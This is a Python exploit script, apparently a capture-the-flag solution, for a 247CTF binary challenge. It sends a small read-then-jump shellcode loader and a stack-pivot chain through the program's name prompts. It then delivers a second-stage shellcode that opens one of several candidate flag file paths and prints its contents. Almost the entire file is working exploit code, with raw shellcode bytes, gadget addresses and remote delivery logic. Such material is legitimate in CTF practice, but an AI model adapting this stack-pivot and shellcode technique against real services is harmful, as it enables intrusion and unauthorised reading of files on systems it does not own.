#!/usr/bin/env python3
from pwn import *
from keystone import Ks, KS_ARCH_X86, KS_MODE_64

HOST = "1a20405e02a419df.247ctf.com"
PORT = 50171

JMP_RSP = 0x400738
XCHG = 0x400732

# First read (50B): loader to fetch stage to current RSP (second+16), then JMP RSP
loader = (
    b"\x31\xC0"      # xor eax,eax
    b"\x31\xFF"      # xor edi,edi
    b"\x48\x89\xE6"# mov rsi,rsp
    b"\xBA\x00\x04\x00\x00"  # mov edx,0x400
    b"\x0F\x05"      # syscall
    b"\xFF\xE4"      # jmp rsp
)
assert len(loader) <= 34
first = loader.ljust(50, b"\x90")

# Second (28B): pivot chain -> jmp rsp -> jmp short back to first start
second = (
    p64(0x1111111111111111) +
    p64(JMP_RSP) +
    b"\xEB\xAE" +      # jmp short -0x52
    b"\x90"*6 +
    p32(XCHG)
)
assert len(second) == 28

def build_stage_try_paths(paths):
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    labels = []
    for i in range(len(paths)):
        labels.append(f"p{i}")
    asm = """
        sub rsp, 0x400
        lea rbx, [rip+plist]
        mov ecx, {n}
    open_loop:
        mov eax, 2
        mov rdi, [rbx]
        xor esi, esi
        xor edx, edx
        syscall
        test rax, rax
        jns got
        add rbx, 8
        loop open_loop
        mov eax, 60
        mov edi, 1
        syscall
    got:
        mov rdi, rax
        xor eax, eax
        mov rsi, rsp
        mov edx, 0x200
        syscall
        mov rdx, rax
        mov edi, 1
        mov eax, 1
        mov rsi, rsp
        syscall
        mov eax, 60
        xor edi, edi
        syscall
    plist:
    """.format(n=len(paths))
    for i in range(len(paths)):
        asm += f"    .quad {labels[i]}\n"
    for i,p in enumerate(paths):
        asm += f"{labels[i]}: .asciz \"{p}\"\n"
    enc,_ = ks.asm(asm)
    return bytes(enc)

# Try common locations
stage = build_stage_try_paths([
    "/flag",
    "flag.txt",
    "./flag",
    "/home/ctf/flag",
    "/home/ctf/flag.txt",
])

io = remote(HOST, PORT)
io.recvuntil(b"first name?")
io.send(first)
io.recvuntil(b"surname?")
io.send(second)
# send stage bytes now
io.send(stage)
# capture
data = io.recvall(timeout=3)
print(data)
